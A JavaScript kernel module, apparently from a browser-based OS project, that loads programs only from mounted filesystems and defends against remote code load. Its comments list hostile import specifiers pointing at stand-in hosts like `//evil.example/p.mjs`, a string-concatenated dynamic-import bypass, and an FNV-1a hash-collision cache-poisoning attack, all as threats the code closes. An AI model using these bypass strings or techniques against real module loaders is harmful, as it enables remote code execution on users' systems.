// `exec`: a program path becomes a loadable image, THROUGH THE FILESYSTEM.
//
// ======================================================================================
// WHY THIS FILE EXISTS, and it is not only that M5 wants ten programs in `/usr/bin`.
//
// Until M5, `SYS_spawn` handed its caller's path to `fetch()`:
//
//     const url = new URL(programUrl, self.location.href)      // src/kernel/kernel.mjs, M1..M4b
//
// A PROCESS-SUPPLIED STRING BECAME A REQUEST ORIGIN. `new URL("https://elsewhere/x.mjs", base)`
// ignores the base, so any process could name any host, have the kernel fetch it from the
// browser's network position, and have the kernel EVALUATE the result as a program. That is both
// the SSRF primitive `src/kernel/providers.mjs` is written to deny — "there is no path by which a
// process-supplied string becomes a request origin" — and arbitrary remote code load, in the one
// call that creates processes. Constraint 123 records it.
//
// So the rule here is the provider table's own rule, applied to programs: the only bytes this
// kernel will run are bytes it read out of a mounted filesystem. A path is resolved through the
// mount table, the execute bit is checked against the caller's credential, and the bytes come from
// the mount. Nothing reaches the network. `/usr`'s own bytes DID come over HTTP, at boot, from a
// committed manifest under a provider id a process cannot name (src/kernel/providerfs.mjs) — that
// is the mount's business, settled before any process exists.
//
// THE PAGE'S OWN `t: "spawn"` KEEPS ITS URL and keeps fetching. The page is the supervisor: it is
// outside the process boundary, it already holds the kernel's whole surface, and a supervisor that
// could not load a program from the repository could not boot a bench at all. The distinction is
// the one that matters — privilege, not convenience — and it is why the two paths are separate
// functions rather than one with a flag.
// ======================================================================================

import { EFBIG, EIO, EISDIR, ENOEXEC, MAX_INLINE, fnv1a } from "../abi.mjs";
import { FILE } from "../fs/vfs.mjs";
import { errnoOfFsError } from "./store.mjs";
import { resolveMount, credOf } from "./calls.mjs";

/**
 * The largest program this kernel will load, in bytes.
 *
 * A BOUND AND NOT A GUESS AT WHAT IS REASONABLE: the bytes are read into the kernel's own heap and
 * then into a Blob, so an unbounded program is a process allocating kernel memory with no cap —
 * the same hazard `OPEN_MAX` and `PROC_CAP` exist for. 1 MiB is ~7x the largest module in this
 * repository (`src/kernel/kernel.mjs`, 73 KiB), so no real program meets it, and EFBIG names what
 * happened rather than leaving a truncated image to fail as a syntax error.
 */
export const PROGRAM_MAX = 1024 * 1024;

/**
 * One chunk of a durable-volume read. MAX_INLINE, because that is the one buffer size this ABI
 * already agrees on, and a read of a shared SAB view has to name a length the other side will
 * accept.
 */
export const EXEC_CHUNK = MAX_INLINE;

/**
 * How many bytes of linked program images the kernel keeps.
 *
 * A BOUND, and it is a bound on a hostile loop rather than a tuning knob. `PROGRAM_MAX` caps ONE
 * image and nothing capped their number: a process writing a 1 MiB program to `/tmp` with one byte
 * varied and spawning it in a loop retained a Blob and a blob URL per iteration — ~1 GiB after a
 * thousand turns, and the renderer dies and takes every process with it, which is constraint 17's
 * failure mode reached through storage instead of workers.
 *
 * 8 MiB is ~47x the whole of `/usr/bin` as it stands (169 KiB over 14 objects), so no real
 * workload evicts anything.
 */
export const IMAGE_CACHE_BYTES = 8 * 1024 * 1024;

/**
 * The I/O worker's view id for the kernel's own loader buffer.
 *
 * NEGATIVE ON PURPOSE. `src/kernel/iocore.mjs` keys registered SABs by pid, pids are monotonic
 * from 1, and a negative key therefore cannot ever be a process's — so a program read cannot
 * land in a process's byte region, and a process cannot name this buffer in any call.
 */
export const EXEC_VIEW_ID = -1;

/**
 * THE SPECIFIERS A PROGRAM MAY IMPORT. An ALLOWLIST of exact literals, and nothing else loads.
 *
 * ======================================================================================
 * AN ALLOWLIST AND NOT A PATTERN, because a pattern was tried and it leaked. The first version
 * rewrote any `/…`-shaped specifier through `new URL(specifier, base)` and refused relative ones.
 * `new URL` RESOLVES A SCHEME-RELATIVE SPECIFIER OFF-ORIGIN — measured against
 * `http://localhost:8000/www/m5.html`:
 *
 *     "//evil.example/p.mjs"    ->  http://evil.example/p.mjs
 *     "/\\evil.example/p.mjs"   ->  http://evil.example/p.mjs      (a backslash is a slash here)
 *     "///x"                    ->  http://x/
 *     "/admin/whatever"         ->  an arbitrary GET on the page's own origin
 *
 * and a bare `https://elsewhere/q.mjs` was not matched at all, so it travelled into the Blob
 * verbatim and the CHILD's module loader fetched it. Four syscalls from any process — write a
 * program to `/tmp` whose text says `import "//elsewhere/p.mjs"`, chmod it, spawn it — and the
 * kernel never calls `fetch` while the renderer loads and evaluates remote code on its behalf.
 * Constraint 123 says what that costs; the loader's own accounting stayed at zero loads, which is
 * the worst property a security fix can have.
 *
 * So: every specifier in the text is extracted and compared against this set by EQUALITY. A
 * specifier that is not in it is -ENOEXEC with the specifier named. There is no URL construction
 * on process-controlled text any more — the only strings `new URL` ever sees are the literals
 * below, which are written here.
 *
 * EACH ENTRY MUST ALSO BE IMPORTED BY `src/libos/process.mjs`, which is the other half of the
 * reason the list is this short: a module no process has already imported would be fetched once
 * per spawned process, which is the herd `src/kernel/kernel.mjs` measured losing 6 of 480
 * connections to. Adding a row here without adding the import there buys a fetch per spawn.
 *
 * WHAT THIS DOES NOT CLOSE, stated because the gap is invisible otherwise: a DYNAMIC
 * `import(expr)` whose argument is computed at run time cannot be caught by reading the text, and
 * no scanner can. The literal forms are caught — `import("…")` goes through the same extraction —
 * but `import("htt" + "ps://…")` does not. The answer is a Content-Security-Policy on the
 * document, which bounds what the renderer will fetch whatever the text says; `scripts/serve.py`
 * sends one, and M6 owns making the process realm unable to reach the network at all
 * (constraint 41). Recorded as constraint 139.
 * ======================================================================================
 */
export const PROGRAM_IMPORTS = Object.freeze(["/src/abi.mjs"]);

/**
 * EVERY string literal that follows `from`, `import` or `import(`.
 *
 * Deliberately broader than the thing being rewritten: the point is to SEE every specifier so an
 * unknown one can be refused, not to find the ones that match a shape. `import(` is included
 * because a literal dynamic import is a specifier like any other.
 *
 * It over-matches a string that merely follows the word `import` in a comment — and that is the
 * safe direction: a program whose comment says `import "x"` is refused and says why, where the
 * reverse would be a specifier nobody checked. Linear: a fixed alternation, `\s*`, then one
 * non-nested `[^"']*`. No nested quantifier for a hostile program to backtrack.
 */
const ANY_SPECIFIER = /(\bfrom\s*|\bimport\s*\(?\s*)(["'])([^"']*)\2/g;

/**
 * Link a program: every specifier checked against the allowlist, then rewritten to the absolute
 * URL the libos already has in its module map. PURE over (text, base).
 *
 * `resolved` is returned rather than assumed so a check can assert the count: a loader that
 * silently stopped rewriting would leave every program importing nothing and failing identically.
 * `unlinkable` names the FIRST refused specifier, because a refusal that does not say which string
 * it refused is the afternoon constraint 125 records.
 */
export function linkProgram(text, base) {
  let resolved = 0;
  let unlinkable = "";
  const code = text.replace(ANY_SPECIFIER, (all, lead, quote, specifier) => {
    if (!PROGRAM_IMPORTS.includes(specifier)) {
      if (!unlinkable) unlinkable = specifier;
      return all;
    }
    resolved += 1;
    return `${lead}${quote}${new URL(specifier, base).href}${quote}`;
  });
  if (unlinkable) return { code: null, resolved: 0, unlinkable };
  return { code, resolved, unlinkable: "" };
}

const DECODER = new TextDecoder("utf-8", { fatal: false });

/**
 * The exec loader.
 *
 * @param {object} ctx
 * @param {() => object} ctx.mounts   the live mount table — a getter, because it is built after
 *                                    this is constructed at boot.
 * @param {() => object} ctx.store    the live Store, for the durable volume.
 * @param {() => Uint8Array} ctx.execView  the kernel's loader buffer, a view on the SAB registered
 *                                    with the I/O worker under EXEC_VIEW_ID.
 * @param {string} ctx.base           the URL absolute specifiers resolve against.
 * @param {(why: string) => void} [ctx.note]
 */
export function makeExec(ctx) {
  /**
   * CONTENT-ADDRESSED, not path-addressed, and the HASH IS NOT TRUSTED ON ITS OWN.
   *
   * A path key would serve a stale image after the file behind it changed, which is exactly what a
   * shell writing a program and then running it does. Hashing the bytes means a rewritten program
   * gets a new entry with no invalidation logic to get wrong.
   *
   * BUT A HIT IS CONFIRMED BY COMPARING THE BYTES, because FNV-1a-32 is trivially collidable: a
   * meet-in-the-middle over four tail bytes finds a same-length collision in milliseconds, and the
   * dangerous direction is POISONING rather than reuse. An unprivileged process writes a 38-byte
   * file whose hash and length match a program in `/usr/bin`, execs it once, and the Map then holds
   * its bytes under that key — so a LATER `spawn` of the real program, from any process including
   * a root shell, runs the attacker's text. The mount, the permission check and the read would all
   * have behaved correctly and the Map would have decided what ran. The compare is O(n) on a hit
   * only, and it is exact; the hash is reduced to what it should be, an index.
   *
   * The Blob is never revoked while its entry lives: a process may still be importing it, and only
   * eviction ends that. Eviction is by insertion order and never touches the entry just added.
   */
  const images = new Map();
  let cachedBytes = 0;
  let loads = 0;
  let cacheHits = 0;
  let hashCollisions = 0;
  let evictions = 0;
  let bytesRead = 0;
  let durableReads = 0;
  let durableWaits = 0;

  /** Whether two byte arrays are equal. The whole of what makes a cache hit trustworthy. */
  function sameBytes(a, b) {
    if (a.length !== b.length) return false;
    for (let i = 0; i < a.length; i += 1) if (a[i] !== b[i]) return false;
    return true;
  }

  /**
   * Keep the cache under its ceiling, oldest first, and REVOKE what goes.
   *
   * `keep` is the key just inserted and is never evicted: a program is imported by its child
   * immediately after `spawn` returns, so revoking the entry this load just made would break the
   * spawn that paid for it.
   */
  function evictTo(limit, keep) {
    for (const [key, image] of images) {
      if (cachedBytes <= limit) return;
      if (key === keep) continue;
      URL.revokeObjectURL(image.imageUrl);
      images.delete(key);
      cachedBytes -= image.bytes;
      evictions += 1;
    }
  }

  /**
   * THE LOADER BUFFER IS SHARED AND THE READS ARE ASYNC, so they are serialized here.
   *
   * Two processes calling `SYS_spawn` in the same tick are two `later()` bodies that interleave at
   * every await, and both would read into offset 0 of the one SAB the I/O worker knows about: each
   * load would assemble a mixture of the two programs, and the result would be a syntax error
   * naming a line in neither file. A promise chain is the whole of the fix — a second buffer per
   * load would also work and would cost a SharedArrayBuffer allocation plus a register/unregister
   * round trip per exec, for a path that is already awaiting storage.
   */
  let gate = Promise.resolve();

  function locked(body) {
    const run = gate.then(body, body);
    // The chain must not break on a rejection, or every later exec waits on a settled-rejected
    // promise and throws something it did not do.
    gate = run.then(() => {}, () => {});
    return run;
  }

  /** The bytes of one program file, or a negative errno. */
  async function readProgram(p, path) {
    const at = resolveMount(p, { mounts: ctx.mounts() }, path);
    if (typeof at === "number") return at;
    let decision;
    try {
      // wantX IS THE EXEC CHECK, and it runs inside the filesystem that owns the file so that
      // there is ONE implementation of the mode bits (src/fs/vfs.mjs `#may`). A check written here
      // would be a second permission model, and the two would disagree about group ownership on
      // the first file that had any.
      decision = at.mount.fs.openDecision(credOf(p), at.rel, { wantR: true, wantX: true });
    } catch (error) {
      return errnoOfFsError(error);
    }
    if (decision.type !== FILE) return -EISDIR;

    if (decision.synth) {
      if (decision.bytes.length > PROGRAM_MAX) return -EFBIG;
      bytesRead += decision.bytes.length;
      return decision.bytes;
    }
    // `decision.type !== FILE` is handled by the filesystems themselves: both throw EISDIR for a
    // directory when `dirOk` is unset, so a caller cannot reach here with one.
    if (decision.tmpfs) {
      const size = at.mount.fs.size(decision.ino);
      if (size > PROGRAM_MAX) return -EFBIG;
      const out = new Uint8Array(size);
      try {
        at.mount.fs.read(decision.ino, 0, size, out, 0);
      } catch (error) {
        return errnoOfFsError(error);
      }
      bytesRead += size;
      return out;
    }
    durableReads += 1;
    if (gatePending()) durableWaits += 1;
    return locked(() => readDurable(decision));
  }

  /** Whether a durable read is in flight right now. A COUNTER'S INPUT, not a control flow: it is
   *  how "two execs overlapped and the lock held" becomes a number a check can assert instead of
   *  a claim about a race nobody observed. */
  let inDurable = false;

  function gatePending() {
    return inDurable;
  }

  /**
   * A program on the OPFS volume.
   *
   * THE READ GOES THROUGH THE SAME `Store.readFd` EVERY `read(2)` GOES THROUGH, into a SAB the
   * kernel owns instead of a process's. Reaching for the blob directly would be a second reader
   * of a file's extent, and `src/kernel/store.mjs` records what that costs: an unclamped read
   * hands back bytes above the published size that nobody committed.
   */
  async function readDurable(decision) {
    const store = ctx.store();
    // Unreachable in a booted kernel — the mount table is only built when the volume mounted — and
    // -EIO rather than a throw, because the honest answer for a kernel that cannot reach storage
    // is the same one `SYS_open` gives.
    if (!store) return -EIO;
    inDurable = true;
    try {
      return await readDurableHeld(store, decision);
    } finally {
      inDurable = false;
    }
  }

  async function readDurableHeld(store, decision) {
    const d = await store.openFd(decision);
    if (typeof d === "number") return d;
    // The fields `Store` expects on a description it did not finish building. `files.mjs`'s F_FILE
    // row is not involved — nothing here installs an fd — but `readFd` reads `d.pos` on the cursor
    // path, and every read below is POSITIONAL so the cursor is never consulted.
    d.refs = 1;
    d.pos = 0;
    try {
      /* EVERY CHUNK UNDER ONE INODE LOCK, and that is a correctness requirement rather than a
       * performance choice. `readFd` takes the lock PER CALL, so a two-chunk program read could be
       * interleaved by another process's `fsync` of the same file: chunk 0 from generation n and
       * chunk 1 from generation n+1, spliced into a module that exists in no file and then hashed,
       * cached and run. Linux cannot produce this — the image is pinned and a write to a running
       * executable is ETXTBSY — and the equivalent here is to hold the inode for the whole read.
       * `readHeld` is `readFd`'s body without the lock, which is the same pattern store.mjs uses
       * internally. */
      return await store.withInode(d.ino, () => readChunks(store, d));
    } finally {
      /* `release`, NEVER `closeFd`, and the difference is a durable write.
       *
       * `closeFd` runs `commit(d)` on any non-read-only file description, and `commitOnce` with
       * nothing staged publishes the blob's PHYSICAL extent whenever it exceeds the metadata's
       * size — which is exactly where another description's un-fsynced append lives. So closing an
       * exec's description could publish a generation and append a journal record on behalf of a
       * writer that never called `fsync`: a call documented as a read mutating the volume.
       *
       * This description never wrote, so the only thing `openFd` took that has to be given back is
       * the handle-row reference it `acquire`d — and `release` is that, under the same lock
       * `openFd` took it under. The sync access handle is AN EXCLUSIVE LOCK PER FILE
       * (src/kernel/calls.mjs says what leaking one costs: the file becomes unopenable by
       * anything, by any process, for the life of the page), so this runs on the throw path too.
       */
      if (d.type === "file") await store.withInode(d.ino, () => store.release(d.ino));
    }
  }

  /** The chunk loop, under the caller's inode lock. Positional reads only, so `d.pos` is never
   *  consulted and no two chunks can disagree about which generation they came from. */
  async function readChunks(store, d) {
    const view = ctx.execView();
    const parts = [];
    let total = 0;
    for (;;) {
      const n = await store.readHeld(d, EXEC_VIEW_ID, 0, EXEC_CHUNK, total);
      if (n < 0) return n;
      if (n === 0) break;
      // COPIED OUT OF THE SHARED VIEW IMMEDIATELY. `slice` on a Uint8Array over a
      // SharedArrayBuffer returns a non-shared copy; keeping the subarray would alias a buffer
      // the next chunk overwrites.
      parts.push(view.slice(0, n));
      total += n;
      // COUNTED BEFORE THE REFUSAL, so the counter does not go blind on exactly the path a check
      // would want to measure.
      bytesRead += n;
      if (total > PROGRAM_MAX) return -EFBIG;
    }
    const out = new Uint8Array(total);
    let off = 0;
    for (const part of parts) {
      out.set(part, off);
      off += part.length;
    }
    return out;
  }

  return {
    /**
     * Load `path` as a program for process `p`. Returns an image, or a NEGATIVE ERRNO.
     *
     * @returns {Promise<{url: string, imageUrl: string, bytes: number, resolved: number,
     *                    hash: number, reused: boolean}|number>}
     */
    async load(p, path) {
      const bytes = await readProgram(p, path);
      if (typeof bytes === "number") return bytes;
      if (bytes.length === 0) {
        // An empty file is not a program. ENOEXEC and not a module that exports nothing, because
        // the latter arrives at `program.run` as `undefined is not a function` inside the child.
        return -ENOEXEC;
      }
      const hash = fnv1a(bytes, 0, bytes.length);
      const key = `${hash}:${bytes.length}`;
      const cached = images.get(key);
      if (cached) {
        // THE HIT IS CONFIRMED AGAINST THE BYTES. A matching hash and length is an index, not an
        // identity: FNV-1a-32 collides on demand, and a process that poisons this entry would
        // otherwise choose the code another process runs. A collision is counted and the loader
        // simply links the real bytes instead — the cache is an optimisation, so losing it costs a
        // Blob and nothing else.
        if (sameBytes(cached.source, bytes)) {
          cacheHits += 1;
          return { ...cached, source: undefined, url: path, reused: true };
        }
        hashCollisions += 1;
        if (ctx.note) {
          ctx.note(`exec ${path}: a cached image has this content hash and different bytes; `
            + "linking the file's own bytes. A deliberate collision is cheap against FNV-1a, so "
            + "this is a refusal to trust the hash and not a storage fault");
        }
      }
      let text;
      try {
        text = DECODER.decode(bytes);
      } catch (error) {
        return -ENOEXEC;
      }
      const { code, resolved, unlinkable } = linkProgram(text, ctx.base);
      if (unlinkable) {
        // ENOEXEC WITH A NAME. The alternative is the measured one: the blob loads, its import
        // fails inside the child, and the only trace is a faulted process that never issued a
        // syscall.
        if (ctx.note) {
          ctx.note(`exec ${path}: relative specifier ${JSON.stringify(unlinkable)} cannot be `
            + "linked into a program image — use an absolute specifier such as /src/abi.mjs");
        }
        return -ENOEXEC;
      }
      const image = {
        url: path,
        imageUrl: URL.createObjectURL(new Blob([code], { type: "text/javascript" })),
        // THE BYTES, kept so a later hit can be confirmed rather than believed. This is what the
        // cache ceiling is counted against.
        source: bytes,
        bytes: bytes.length,
        resolved,
        hash,
      };
      images.set(key, image);
      cachedBytes += image.bytes;
      loads += 1;
      // THE CEILING IS ENFORCED AFTER THE INSERT, never before, so the entry this load just made
      // is the one entry eviction may not take — its child is about to import it.
      evictTo(IMAGE_CACHE_BYTES, key);
      // `source` is the cache's copy and is not part of what a caller is handed: a spawn does not
      // need the program text, and returning it would put a megabyte in a message.
      return { ...image, source: undefined, reused: false };
    },

    /** The loader's own counters, so "the program crossed the wire zero times" is a measurement.
     *  `fetches` is absent deliberately: there is no fetch in this file to count. */
    stats() {
      return {
        images: images.size, cachedBytes, loads, cacheHits, bytesRead,
        durableReads, durableWaits,
        // BOTH REFUSAL COUNTERS ARE PUBLISHED, because each is a security property that is
        // invisible when it holds: a hash collision the loader declined to trust, and an image the
        // ceiling evicted rather than retaining without bound.
        hashCollisions, evictions,
      };
    },
  };
}
